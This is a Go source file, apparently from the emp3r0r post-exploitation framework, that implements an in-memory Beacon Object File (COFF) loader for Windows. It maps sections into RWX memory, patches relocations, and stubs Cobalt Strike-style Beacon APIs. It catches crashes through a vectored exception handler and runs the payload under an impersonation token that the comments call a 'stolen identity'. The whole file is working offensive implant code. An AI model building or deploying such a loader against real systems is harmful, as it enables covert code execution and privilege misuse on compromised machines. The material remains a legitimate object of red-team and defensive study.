//go:build windows

package coffloader

import (
	"fmt"
	"runtime/debug"
	"strings"
	"sync"
	"syscall"
	"unsafe"

	"github.com/RIscRIpt/pecoff"
	"github.com/RIscRIpt/pecoff/binutil"
	"github.com/RIscRIpt/pecoff/windef"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
	"golang.org/x/sys/windows"
)

// PreExecHook is called on the BOF goroutine immediately before the COFF
// entry point is invoked. It receives the impersonation token handle (0 if
// none). The hook should lock the OS thread and impersonate.
var PreExecHook func(token uintptr)

// PostExecHook is called on the BOF goroutine immediately after the COFF
// entry point returns (or panics). It should revert impersonation and
// unlock the OS thread.
var PostExecHook func()

// activeToken is the token handle passed to RunWindowsCOFF for the current
// execution; it is read by invokeMethod's goroutine.
var (
	activeTokenMu sync.Mutex
	activeToken   uintptr
)

const (
	MEM_COMMIT             = windows.MEM_COMMIT
	MEM_RESERVE            = windows.MEM_RESERVE
	PAGE_EXECUTE_READWRITE = windows.PAGE_EXECUTE_READWRITE
	PAGE_EXECUTE_READ      = windows.PAGE_EXECUTE_READ
	PAGE_READWRITE         = windows.PAGE_READWRITE
	IMAGE_SCN_MEM_EXECUTE  = 0x20000000
)

var (
	kernel32                           = syscall.MustLoadDLL("kernel32.dll")
	procVirtualAlloc                   = kernel32.MustFindProc("VirtualAlloc")
	procVirtualProtect                 = kernel32.MustFindProc("VirtualProtect")
	procVirtualFree                    = kernel32.MustFindProc("VirtualFree")
	procAddVectoredExceptionHandler    = kernel32.MustFindProc("AddVectoredExceptionHandler")
	procRemoveVectoredExceptionHandler = kernel32.MustFindProc("RemoveVectoredExceptionHandler")

	isExecutingBOF    bool
	bofExceptionCode  uint32
	bofExceptionAddr  uintptr
	vehHandlerHandle  uintptr
	bofRecoveryHandle uintptr
)

type exceptionRecordStruct struct {
	ExceptionCode        uint32
	ExceptionFlags       uint32
	ExceptionRecord      uintptr
	ExceptionAddress     uintptr
	NumberParameters     uint32
	ExceptionInformation [15]uintptr
}

type exceptionPointersStruct struct {
	ExceptionRecord *exceptionRecordStruct
	ContextRecord   uintptr
}

func initVEH() {
	if vehHandlerHandle != 0 {
		return
	}
	bofRecoveryHandle = windows.NewCallback(bofRecoveryStub)
	handlerCallback := windows.NewCallback(vehHandler)
	ret, _, _ := procAddVectoredExceptionHandler.Call(1, handlerCallback)
	vehHandlerHandle = ret
}

func bofRecoveryStub() uintptr {
	panic(fmt.Sprintf("BOF native SEH exception 0x%X at address 0x%X", bofExceptionCode, bofExceptionAddr))
}

func vehHandler(exceptionPointers uintptr) uintptr {
	if exceptionPointers == 0 || !isExecutingBOF {
		return 0 // EXCEPTION_CONTINUE_SEARCH
	}

	ep := (*exceptionPointersStruct)(unsafe.Pointer(exceptionPointers))
	if ep == nil || ep.ExceptionRecord == nil || ep.ContextRecord == 0 {
		return 0
	}

	code := ep.ExceptionRecord.ExceptionCode
	if code >= 0x80000000 {
		bofExceptionCode = code
		bofExceptionAddr = ep.ExceptionRecord.ExceptionAddress
		isExecutingBOF = false

		if unsafe.Sizeof(uintptr(0)) == 8 {
			// 64-bit AMD64: RIP offset is 0xF8 (248) inside CONTEXT
			*(*uintptr)(unsafe.Pointer(ep.ContextRecord + 0xF8)) = bofRecoveryHandle
		} else {
			// 32-bit x86: EIP offset is 0xB4 (180) inside CONTEXT
			*(*uintptr)(unsafe.Pointer(ep.ContextRecord + 0xB4)) = bofRecoveryHandle
		}

		return ^uintptr(0) // EXCEPTION_CONTINUE_EXECUTION (-1)
	}

	return 0 // EXCEPTION_CONTINUE_SEARCH
}

func virtualProtectError(ret uintptr, err error) error {
	if ret != 0 {
		return nil
	}
	if err != nil {
		return fmt.Errorf("Error calling VirtualProtect: %w", err)
	}
	return fmt.Errorf("Error calling VirtualProtect (returned 0)")
}

func resolveExternalAddress(symbolName string, outChannel chan<- any) uintptr {
	if strings.HasPrefix(symbolName, "__imp_") {
		symbolName = symbolName[6:]
		symbolName = strings.TrimPrefix(symbolName, "_")

		libName := ""
		procName := ""
		parts := strings.Split(symbolName, "$")
		if len(parts) == 2 {
			libName = parts[0] + ".dll"
			procName = parts[1]
		} else {
			procName = symbolName

			switch procName {
			case "FreeLibrary", "LoadLibraryA", "GetProcAddress", "GetModuleHandleA", "GetModuleFileNameA":
				libName = "kernel32.dll"
			case "MessageBoxA":
				libName = "user32.dll"
			case "BeaconOutput":
				return windows.NewCallback(GetCoffOutputForChannel(outChannel))
			case "BeaconDataParse":
				return windows.NewCallback(DataParse)
			case "BeaconDataInt":
				return windows.NewCallback(DataInt)
			case "BeaconDataShort":
				return windows.NewCallback(DataShort)
			case "BeaconDataLength":
				return windows.NewCallback(DataLength)
			case "BeaconDataExtract":
				return windows.NewCallback(DataExtract)
			case "BeaconPrintf":
				return windows.NewCallback(GetCoffPrintfForChannel(outChannel))
			case "BeaconAddValue":
				return windows.NewCallback(AddValue)
			case "BeaconGetValue":
				return windows.NewCallback(GetValue)
			case "BeaconRemoveValue":
				return windows.NewCallback(RemoveValue)
			case "BeaconFormatAlloc":
				return windows.NewCallback(BeaconFormatAlloc)
			case "BeaconFormatReset":
				return windows.NewCallback(BeaconFormatReset)
			case "BeaconFormatFree":
				return windows.NewCallback(BeaconFormatFree)
			case "BeaconFormatAppend":
				return windows.NewCallback(BeaconFormatAppend)
			case "BeaconFormatPrintf":
				return windows.NewCallback(BeaconFormatPrintf)
			case "BeaconFormatToString":
				return windows.NewCallback(BeaconFormatToString)
			case "BeaconFormatInt":
				return windows.NewCallback(BeaconFormatInt)
			case "BeaconUseToken", "BeaconRevertToken", "BeaconIsAdmin", "BeaconGetSpawnTo",
				"BeaconSpawnTemporaryProcess", "BeaconInjectProcess", "BeaconInjectTemporaryProcess",
				"BeaconCleanupProcess", "toWideChar", "BeaconGetOutputData":
				fallthrough
			default:
				logging.Warningf("Unknown symbol: %s\n", procName)
				return 0
			}
		}

		libStringPtr, err := syscall.LoadLibrary(libName)
		if err != nil {
			logging.Errorf("Failed to load library %s for symbol %s: %v", libName, symbolName, err)
			return 0
		}
		procAddress, err := syscall.GetProcAddress(libStringPtr, procName)
		if err != nil {
			logging.Errorf("Failed to get proc address %s in %s for symbol %s: %v", procName, libName, symbolName, err)
			return 0
		}
		return procAddress
	}
	return 0
}

func virtualAlloc(lpAddress uintptr, dwSize uintptr, flAllocationType uint32, flProtect uint32) (uintptr, error) {
	ret, _, err := procVirtualAlloc.Call(
		lpAddress,
		dwSize,
		uintptr(flAllocationType),
		uintptr(flProtect),
	)
	if ret == 0 {
		if err != nil && err != windows.ERROR_SUCCESS {
			return 0, fmt.Errorf("VirtualAlloc call failed: %w", err)
		}
		return 0, fmt.Errorf("VirtualAlloc call returned NULL")
	}
	return ret, nil
}

func isSpecialSymbol(sym *pecoff.Symbol) bool {
	if sym == nil {
		return false
	}
	return sym.StorageClass == windef.IMAGE_SYM_CLASS_EXTERNAL && sym.SectionNumber == 0
}

func isImportSymbol(sym *pecoff.Symbol) bool {
	if sym == nil {
		return false
	}
	return strings.HasPrefix(sym.NameString(), "__imp_")
}

func processRelocation(symbolDefAddress uintptr, sectionAddress uintptr, reloc windef.Relocation, symbol *pecoff.Symbol) error {
	if sectionAddress == 0 {
		return fmt.Errorf("invalid section address (0)")
	}
	symbolOffset := uintptr(reloc.VirtualAddress)
	absoluteSymbolAddress := symbolOffset + sectionAddress
	segmentValue := *(*uint32)(unsafe.Pointer(absoluteSymbolAddress))

	if (symbol.StorageClass == windef.IMAGE_SYM_CLASS_STATIC && symbol.Value != 0) ||
		(symbol.StorageClass == windef.IMAGE_SYM_CLASS_EXTERNAL && symbol.SectionNumber != 0) {
		symbolOffset = uintptr(symbol.Value)
	} else {
		symbolDefAddress += uintptr(segmentValue)
	}

	symbolRefAddress := sectionAddress

	switch reloc.Type {
	case windef.IMAGE_REL_AMD64_ADDR64:
		addr := (*uint64)(unsafe.Pointer(absoluteSymbolAddress))
		*addr = uint64(symbolDefAddress)
	case windef.IMAGE_REL_AMD64_ADDR32NB:
		addr := (*uint32)(unsafe.Pointer(absoluteSymbolAddress))
		valueToWrite := symbolDefAddress - (symbolRefAddress + 4 + symbolOffset)
		*addr = uint32(valueToWrite)
	case windef.IMAGE_REL_AMD64_REL32, windef.IMAGE_REL_AMD64_REL32_1, windef.IMAGE_REL_AMD64_REL32_2, windef.IMAGE_REL_AMD64_REL32_3, windef.IMAGE_REL_AMD64_REL32_4, windef.IMAGE_REL_AMD64_REL32_5:
		relativeSymbolDefAddress := symbolDefAddress - uintptr(reloc.Type-4) - (absoluteSymbolAddress + 4)
		addr := (*uint32)(unsafe.Pointer(absoluteSymbolAddress))
		*addr = uint32(relativeSymbolDefAddress)
	default:
		return fmt.Errorf("unsupported relocation type: %d", reloc.Type)
	}
	return nil
}

type CoffSection struct {
	Section *pecoff.Section
	Address uintptr
}

func CoffLoad(coffBytes []byte, argBytes []byte) (string, error) {
	return LoadWithMethod(coffBytes, argBytes, "go")
}

// AlterProtection changes permissions of a memory section
func AlterProtection(oldProtect, newProtect int, addr, size uintptr) error {
	retVirtualProtect, _, errVirtualProtect := procVirtualProtect.Call(addr, uintptr(size), uintptr(newProtect), uintptr(unsafe.Pointer(&oldProtect)))
	if err := virtualProtectError(retVirtualProtect, errVirtualProtect); err != nil {
		return err
	}
	return nil
}

func LoadWithMethod(coffBytes []byte, argBytes []byte, method string) (res string, err error) {
	var baseBlockAddr uintptr
	var totalSize uintptr

	defer func() {
		if r := recover(); r != nil {
			err = fmt.Errorf("LoadWithMethod panic: %v\n%s", r, debug.Stack())
			if baseBlockAddr != 0 && totalSize != 0 {
				_ = AlterProtection(PAGE_EXECUTE_READ, PAGE_READWRITE, baseBlockAddr, totalSize)
				procVirtualFree.Call(baseBlockAddr, 0, windows.MEM_RELEASE)
			}
		}
	}()

	if len(coffBytes) == 0 {
		return "", fmt.Errorf("coffBytes is empty")
	}

	output := make(chan any)

	parsedCoff := pecoff.Explore(binutil.WrapByteSlice(coffBytes))
	if parsedCoff == nil {
		return "", fmt.Errorf("failed to explore COFF payload")
	}

	if parseErr := parsedCoff.ReadAll(); parseErr != nil {
		return "", fmt.Errorf("failed to read COFF structure: %w", parseErr)
	}
	parsedCoff.Seal()

	if parsedCoff.Sections == nil {
		return "", fmt.Errorf("invalid COFF: no sections found")
	}

	sections := make(map[string]CoffSection, parsedCoff.Sections.Len())

	gotOffset := 0
	gotSize := uint32(0)
	gotMap := make(map[string]uintptr)

	bssBaseAddress := uintptr(0)
	bssOffset := 0
	bssSize := uint32(0)

	for _, symbol := range parsedCoff.Symbols {
		if symbol == nil {
			continue
		}
		if isSpecialSymbol(symbol) {
			if isImportSymbol(symbol) {
				gotSize += 8
			} else {
				bssSize += symbol.Value + 8
			}
		}
	}

	// Calculate single contiguous memory allocation for all sections + BSS + GOT
	sectionOffsets := make(map[string]uintptr)

	for _, section := range parsedCoff.Sections.Array() {
		if section == nil {
			continue
		}
		allocationSize := uintptr(section.SizeOfRawData)
		if strings.HasPrefix(section.NameString(), ".bss") {
			allocationSize = uintptr(bssSize)
		}

		if allocationSize == 0 {
			continue
		}

		// Align to 16 bytes
		if totalSize%16 != 0 {
			totalSize += 16 - (totalSize % 16)
		}
		sectionOffsets[section.NameString()] = totalSize
		totalSize += allocationSize
	}

	gotOffsetInBlock := uintptr(0)
	if gotSize > 0 {
		if totalSize%16 != 0 {
			totalSize += 16 - (totalSize % 16)
		}
		gotOffsetInBlock = totalSize
		totalSize += uintptr(gotSize)
	}

	if totalSize == 0 {
		return "", fmt.Errorf("invalid COFF: total allocation size is 0")
	}

	var allocErr error
	baseBlockAddr, allocErr = virtualAlloc(0, totalSize, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
	if allocErr != nil {
		return "", fmt.Errorf("VirtualAlloc failed for COFF payload (%d bytes): %w", totalSize, allocErr)
	}

	gotBaseAddress := uintptr(0)
	if gotSize > 0 {
		gotBaseAddress = baseBlockAddr + gotOffsetInBlock
	}

	for _, section := range parsedCoff.Sections.Array() {
		if section == nil {
			continue
		}
		offset, ok := sectionOffsets[section.NameString()]
		if !ok {
			continue
		}
		addr := baseBlockAddr + offset
		if strings.HasPrefix(section.NameString(), ".bss") {
			bssBaseAddress = addr
		}

		if section.SizeOfRawData > 0 {
			copy((*[1 << 30]byte)(unsafe.Pointer(addr))[:], section.RawData())
		}

		sections[section.NameString()] = CoffSection{
			Section: section,
			Address: addr,
		}
	}

	for _, section := range parsedCoff.Sections.Array() {
		if section == nil {
			continue
		}
		secInfo, ok := sections[section.NameString()]
		if !ok && section.SizeOfRawData > 0 && !strings.HasPrefix(section.NameString(), ".bss") {
			continue
		}
		sectionVirtualAddr := secInfo.Address

		for _, reloc := range section.Relocations() {
			if reloc.SymbolTableIndex >= uint32(len(parsedCoff.Symbols)) {
				return "", fmt.Errorf("relocation symbol table index %d out of bounds (%d symbols)", reloc.SymbolTableIndex, len(parsedCoff.Symbols))
			}

			symbol := parsedCoff.Symbols[reloc.SymbolTableIndex]
			if symbol == nil || symbol.StorageClass > 3 {
				continue
			}

			symbolDefAddress := uintptr(0)

			if isSpecialSymbol(symbol) {
				if isImportSymbol(symbol) {
					externalAddress := resolveExternalAddress(symbol.NameString(), output)

					if externalAddress == 0 {
						return "", fmt.Errorf("failed to resolve external address for symbol: %s", symbol.NameString())
					}

					if existingGotAddress, exists := gotMap[symbol.NameString()]; exists {
						symbolDefAddress = existingGotAddress
					} else {
						symbolDefAddress = gotBaseAddress + uintptr(gotOffset*8)
						gotOffset += 1
						gotMap[symbol.NameString()] = symbolDefAddress
					}
					copy((*[8]byte)(unsafe.Pointer(symbolDefAddress))[:], (*[8]byte)(unsafe.Pointer(&externalAddress))[:])
				} else {
					if bssBaseAddress == 0 {
						return "", fmt.Errorf("bssBaseAddress is 0 when resolving symbol %s", symbol.NameString())
					}
					symbolDefAddress = bssBaseAddress + uintptr(bssOffset)
					bssOffset += int(symbol.Value) + 8
				}
			} else {
				secIdx := int(symbol.SectionNumber) - 1
				if secIdx < 0 || secIdx >= len(parsedCoff.Sections.Array()) {
					return "", fmt.Errorf("invalid section number %d for symbol %s", symbol.SectionNumber, symbol.NameString())
				}
				targetSection := parsedCoff.Sections.Array()[secIdx]
				if targetSection == nil {
					return "", fmt.Errorf("target section for symbol %s is nil", symbol.NameString())
				}
				targetCoffSec, ok := sections[targetSection.NameString()]
				if !ok {
					return "", fmt.Errorf("target section %s not allocated", targetSection.NameString())
				}
				symbolDefAddress = targetCoffSec.Address + uintptr(symbol.Value)
			}

			if relocErr := processRelocation(symbolDefAddress, sectionVirtualAddr, reloc, symbol); relocErr != nil {
				return "", fmt.Errorf("relocation failed for symbol %s: %w", symbol.NameString(), relocErr)
			}
		}
	}

	// Change memory protection of the entire BOF block to PAGE_EXECUTE_READWRITE
	if err := AlterProtection(PAGE_READWRITE, PAGE_EXECUTE_READWRITE, baseBlockAddr, totalSize); err != nil {
		return "", fmt.Errorf("failed to set execution protection on BOF payload: %w", err)
	}

	// Call the entry point
	go invokeMethod(method, argBytes, parsedCoff, sections, output)

	var bofOutput strings.Builder
	for msg := range output {
		if s, ok := msg.(string); ok {
			bofOutput.WriteString(s)
			bofOutput.WriteString("\n")
		} else if msg != nil {
			bofOutput.WriteString(fmt.Sprintf("%v\n", msg))
		}
	}

	// Zero out and release memory block
	memSlice := unsafe.Slice((*byte)(unsafe.Pointer(baseBlockAddr)), totalSize)
	clear(memSlice)
	procVirtualFree.Call(baseBlockAddr, 0, windows.MEM_RELEASE)

	return bofOutput.String(), nil
}

func invokeMethod(methodName string, argBytes []byte, parsedCoff *pecoff.File, sectionMap map[string]CoffSection, outChannel chan<- any) {
	defer close(outChannel)

	defer func() {
		isExecutingBOF = false
		if r := recover(); r != nil {
			errorMsg := fmt.Sprintf("Panic occurred when executing COFF: %v\n%s", r, debug.Stack())
			outChannel <- errorMsg
		}
	}()

	initVEH()

	if parsedCoff == nil || parsedCoff.Sections == nil {
		outChannel <- "COFF file structure is invalid or nil"
		return
	}

	// Call the entry point
	found := false
	for _, symbol := range parsedCoff.Symbols {
		if symbol != nil && symbol.NameString() == methodName {
			found = true
			secIdx := int(symbol.SectionNumber) - 1
			if secIdx < 0 || secIdx >= len(parsedCoff.Sections.Array()) {
				outChannel <- fmt.Sprintf("Invalid section number %d for entry symbol %s", symbol.SectionNumber, methodName)
				return
			}
			mainSection := parsedCoff.Sections.Array()[secIdx]
			if mainSection == nil {
				outChannel <- fmt.Sprintf("Entry section for symbol %s is nil", methodName)
				return
			}
			sec, ok := sectionMap[mainSection.NameString()]
			if !ok || sec.Address == 0 {
				outChannel <- fmt.Sprintf("Entry section %s memory not allocated", mainSection.NameString())
				return
			}
			entryPoint := sec.Address + uintptr(symbol.Value)

			if len(argBytes) == 0 {
				argBytes = make([]byte, 1)
			}

			isExecutingBOF = true

			// If a token was provided, impersonate on this goroutine before
			// calling the BOF so that any Win32 APIs it invokes see the
			// stolen identity.
			activeTokenMu.Lock()
			tok := activeToken
			activeTokenMu.Unlock()
			if tok != 0 && PreExecHook != nil {
				PreExecHook(tok)
				defer func() {
					if PostExecHook != nil {
						PostExecHook()
					}
				}()
			}

			syscall.SyscallN(entryPoint, uintptr(unsafe.Pointer(&argBytes[0])), uintptr(len(argBytes)))
			isExecutingBOF = false
		}
	}
	if !found {
		outChannel <- fmt.Sprintf("Entry symbol '%s' not found in COFF", methodName)
	}
}
